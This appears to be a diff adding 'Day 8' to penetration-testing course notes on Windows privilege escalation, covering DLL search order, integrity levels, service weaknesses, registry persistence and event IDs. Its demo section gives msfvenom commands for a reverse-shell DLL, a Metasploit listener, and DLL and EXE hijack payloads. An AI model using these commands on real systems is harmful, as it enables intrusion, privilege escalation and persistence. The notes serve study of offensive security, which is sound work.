@@ -821,6 +821,171 @@ cat /etc/crontab
 echo $PATH (locate echo, shows where a command is at)
 PATH=.:$PATH (adds a "." to the path)
 
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 8    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Windows Priv Escalation
+------------------
+System is the closest account to root on Windows
+Two default privileged accounts are System and Administrator
+SIDs
+
+DLL Search Order
+----
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+The directory the Application was run from
+The directory specififed in the C+ function GetSystemDirectory()
+The directory specified in the C+ function GetWindowsDirectory()
+The current directory
+
+Windows Integrity Mechanism
+----
+Integrity Levels
+--
+UNTRUSTED - Anonymous SID access tokens
+LOW - Everyone SID access token
+MEDIUM - Authenticated Users
+HIGH - Administrators
+SYSTEM - System services (LocalSystem, LocalService, NetworkService)
+
+AutoElevate Executables
+----
+Requested Execution Levels:
+  asInvoker
+  highestAvailable
+If an application requires you to specify that you want to run as administrator then it is asInvoker
+
+Scheduled Tasks and Services
+----
+Items to evaluate include:
+  Write permissions
+  Non-Standard Locations
+  Unquoted Executable Paths
+  Vulnerabilities in Executables
+  Permissions to Run as SYSTEM
+
+Other Vulnerabilities
+----
+Unpatched Kernel Vulnerabilities
+Unpatched Systems
+Unpatched Applications
+
+Persistence
+----
+Survives:
+Reboots
+Credential Changes
+DHCP IP reassignment
+Etc
+
+Considerations:
+File naming
+File location
+Timestomping
+Port selection
+
+Registry
+----
+HKEY_LOCALMACHINE\Software\Microsoft\Windows\CurrentVersion\Run & RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run & RunOnce
+
+Services
+----
+At Startup
+Perform Multiple Functions
+Typically require Administrative Access
+
+System usage
+----
+Where should you run commands from?
+Check system resources
+--
+wmic
+net
+netstat
+
+Important Microsoft Event IDs
+----
+4624/4625 - Successful/failed login
+4720 - Account created
+4672 - Administrative user logged on
+7045 - Service created
+
+Demos
+----
+use rdp to attack a windows machine
+
+Elevating privieleges
+--------
+check services
+services in search bar
+sort services by the description
+
+DLL Hijacking
+----
+use procmon
+filter by "Process Name" "Contains" "putty.exe", "Path" "Contains" ".dll", "Result" "is" "NAME NOT FOUND"
+run the process with procmon open
+select one of the DLLs from the list
+
+From Lin-ops
+++++
+msfvenom -p windows/shell_reverse_tcp LHOST=<OwnIP> LPORT=<RHP> -f dll > <DLLname>
+scp from the windows machine to the linux machine the DLL
+scp <user>@<linux machine IP>:<DLLname> . (On windows machine)
+msfconsole
+use multi/handler
+set payload windows/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT <RHP above>
+show options to check
+run
+should get a shell prompt
+
+if no shell prompt
+--
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f dll > SSPICLI.dll
+
+can be used to create account, add it to administrator group, add it to remote desktop users
+
+EXE Hijacking
+----
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f exe > putty.exe
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
